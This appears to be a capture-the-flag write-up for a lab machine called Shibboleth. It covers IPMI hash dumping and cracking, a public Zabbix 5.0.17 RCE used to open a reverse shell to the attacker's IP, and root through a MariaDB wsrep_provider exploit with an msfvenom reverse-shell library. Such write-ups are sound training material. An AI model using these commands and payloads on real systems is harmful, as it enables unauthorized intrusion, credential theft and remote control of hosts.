# Shibboleth

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.78.109
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-27 15:26 +08
Nmap scan report for 10.129.78.109
Host is up (0.0080s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http
```

We have to add `shibboleth.htb` to our `/etc/hosts` file before we can view the web application.&#x20;

### FlexStart -> Bare Metal BMC

The web application is a typical corporate page:

<figure><img src="../../../.gitbook/assets/image (1574).png" alt=""><figcaption></figcaption></figure>

Most of the site was static and didn't do anything. However, there was one interesting part at the bottom:

<figure><img src="../../../.gitbook/assets/image (3882).png" alt=""><figcaption></figcaption></figure>

I ran a subdomain scan with `wfuzz` and found a few subdomains present:

<pre><code>$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hc=302 -H 'Host: FUZZ.shibboleth.htb' -u http://shibboleth.htb
********************************************************
<strong>* Wfuzz 3.1.0 - The Web Fuzzer                         *
</strong>********************************************************

Target: http://shibboleth.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                     
=====================================================================

000000099:   200        29 L     219 W      3687 Ch     "monitor"                   
000000346:   200        29 L     219 W      3687 Ch     "monitoring"                
000000390:   200        29 L     219 W      3687 Ch     "zabbix"
</code></pre>

All 3 subdomains all pointed to the same place. The `zabbix` instance required credentials:

<figure><img src="../../../.gitbook/assets/image (1631).png" alt=""><figcaption></figcaption></figure>

&#x20;A directory scan with `gobuster` does show some directories, but there weren't anything in them.

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://shibboleth.htb -t 100 
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://shibboleth.htb
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/06/27 15:30:39 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 317] [-> http://shibboleth.htb/assets/]
/forms                (Status: 301) [Size: 316] [-> http://shibboleth.htb/forms/]
/server-status        (Status: 403) [Size: 279]
Progress: 217816 / 220561 (98.76%)===============================================================
2023/06/27 15:31:07 Finished
===============================================================
```

Since there weren't many leads, I searched a bit more on the Bare Metal BMC Automation thing, because it looked as if it was intentionally left there since the rest of the site is basically Lorem Ipsum.&#x20;

Searching on Hacktricks for Bare Metal BMC reveals that it opens port 623 for UDP traffic using the IPMI protocol.

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/623-udp-ipmi" %}

An `nmap` scan reveals it is open but filtered:

```
$ sudo nmap -sU --min-rate 5000 -p 623 10.128.87.109
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-27 15:37 +08
Nmap scan report for 10.128.87.109
Host is up (0.00039s latency).

PORT    STATE         SERVICE
623/udp open|filtered asf-rmcp

Nmap done: 1 IP address (1 host up) scanned in 2.40 seconds
```

### IPMI Exploit -> Zabbix Creds

Hacktricks uses both Metasploit and `ipmitool` to run certain exploits on this, and we can try all of the exploits there. First, we can enumerate the version and other information:

```
msf6 auxiliary(scanner/ipmi/ipmi_version) > set RHOSTS 10.129.78.109
RHOSTS => 10.129.78.109
msf6 auxiliary(scanner/ipmi/ipmi_version) > run

[*] Sending IPMI requests to 10.129.78.109->10.129.78.109 (1 hosts)
[+] 10.129.78.109:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Then, we can try the dump hashes method on this. Metasploit has a built in wordlist to use for it.&#x20;

```
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set RHOSTS shibboleth.htb
RHOSTS => shibboleth.htb
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.78.109:623 - IPMI - Hash found: Administrator:146a600c02030000d35fd619c358b5972202f43f0d805a59be61999d29fa9cb488c04c7aeb19e6c9a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:2fb52f26c84b9d7fd3972b0f304ac5c70103e63a
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

We have a hash! Based on the protocol, we can head to the example hashes page for `hashcat` and find that this uses mode 7300.

{% embed url="https://hashcat.net/wiki/doku.php?id=example_hashes" %}

Then, we can crack it.

{% code overflow="wrap" %}
```
$ hashcat -a 0 -m 7300 hash /usr/share/wordlists/rockyou.txt
146a600c02030000d35fd619c358b5972202f43f0d805a59be61999d29fa9cb488c04c7aeb19e6c9a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:2fb52f26c84b9d7fd3972b0f304ac5c70103e63a:ilovepumkinpie1
```
{% endcode %}

With these credentials, we can login to the Zabbix instance:

<figure><img src="../../../.gitbook/assets/image (2432).png" alt=""><figcaption></figcaption></figure>

### Zabbix RCE

At the bottom of the page, it says it is running Zabbix 5.0.17. This has an RCE exploit that is publicly available.

{% embed url="https://www.exploit-db.com/exploits/50816" %}

We can run this PoC and get a shell:

```
$ python3 rce.py http://zabbix.shibboleth.htb Administrator ilovepumkinpie1 10.10.14.42 4444
[*] this exploit is tested against Zabbix 5.0.17 only
[*] can reach the author @ https://hussienmisbah.github.io/                                  
[+] the payload has been Uploaded Successfully                                               
[+] you should find it at http://zabbix.shibboleth.htb/items.php?form=update&hostid=10084&itemid=33617                                                                                    
[+] set the listener at 4444 please...                                                       
[?] note : it takes up to +1 min so be patient :)                                            
[+] got a shell ? [y]es/[N]o:
```

<figure><img src="../../../.gitbook/assets/image (1914).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

We cannot read the user flag from the `ipmi-svc` user yet, so we can first enumerate processes or any misconfigurations left behind by the user.&#x20;

### Credential Reuse

There was nothing in the machine as the `zabbix` user. However, attempting to do password reuse with the password found earlier works.

<figure><img src="../../../.gitbook/assets/image (3473).png" alt=""><figcaption></figcaption></figure>

### Pspy -> MySQL Exploit

I found some interesting processes using `pspy64` here:

```
2023/06/27 08:56:25 CMD: UID=0    PID=955    | /usr/bin/ipmi_sim -n -c /etc/ayelow/ipmi_lan.conf -f /etc/ayelow/sim.emu                                                                                           
2023/06/27 08:56:25 CMD: UID=0    PID=954    | /bin/bash /usr/local/bin/ayelow.sh 
2023/06/27 08:56:25 CMD: UID=0    PID=1259   | logger -t mysqld -p daemon error 
2023/06/27 08:56:25 CMD: UID=0    PID=1258   | /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/x86_64-linux-gnu/mariadb19/plugin --user=root --skip-log-error --pid-file=/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock
```

The most interesting was the `mysqld` one, since it was running MySQL as the `root` user. We can first enumerate the `mysql` version present:

```
ipmi-svc@shibboleth:/tmp$ mysql --version
mysql  Ver 15.1 Distrib 10.3.25-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2
```

Turns out, this is vulnerable to an RCE exploit:

{% embed url="https://github.com/Al1ex/CVE-2021-27928" %}

To exploit this, we first need to generate a Shared Object file using `msfvenom`:

```
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.42 LPORT=5555 -f elf-so -o shell.so
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf-so file: 476 bytes
Saved as: shell.so
```

Then we can transfer this to the machine. Then, we need to find the password for the MySQL instance. I took a look at the `/etc/zabbix` files since the `ipmi_svc` user can read some of the files:

```
ipmi-svc@shibboleth:/etc/zabbix$ ls -la
total 100
drwxr-xr-x  4 root     root      4096 Nov  8  2021 .
drwxr-xr-x 96 root     root      4096 Nov  8  2021 ..
-r--------  1 zabbix   zabbix      33 Apr 24  2021 peeesskay.psk
drwxr-xr-x  2 www-data root      4096 Apr 27  2021 web
-rw-r--r--  1 root     root     15317 May 25  2021 zabbix_agentd.conf
-rw-r--r--  1 root     root     15574 Oct 18  2021 zabbix_agentd.conf.dpkg-dist
drwxr-xr-x  2 root     root      4096 Apr 27  2021 zabbix_agentd.d
-rw-r-----  1 root     ipmi-svc 21863 Apr 24  2021 zabbix_server.conf
-rw-r-----  1 root     ipmi-svc 22306 Oct 18  2021 zabbix_server.conf.dpkg-dist

ipmi-svc@shibboleth:/etc/zabbix$ cat zabbix_server.conf
<TRUNCATED>
DBUser=zabbix

### Option: DBPassword
#       Database password.
#       Comment this line if no password is used.
#
# Mandatory: no
# Default:
DBPassword=bloooarskybluh
<TRUNCATED>
```

Great! Now we have the creds needed. We just need to login using those credentials and run this command:

```
ipmi-svc@shibboleth:/dev/shm$ mysql -u zabbix -pbloooarskybluh
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 621
Server version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> SET GLOBAL wsrep_provider="/dev/shm/shell.so";
ERROR 2013 (HY000): Lost connection to MySQL server during query
```

This would spawn a `root` shell on our listener port!

<figure><img src="../../../.gitbook/assets/image (2618).png" alt=""><figcaption></figcaption></figure>

Rooted!
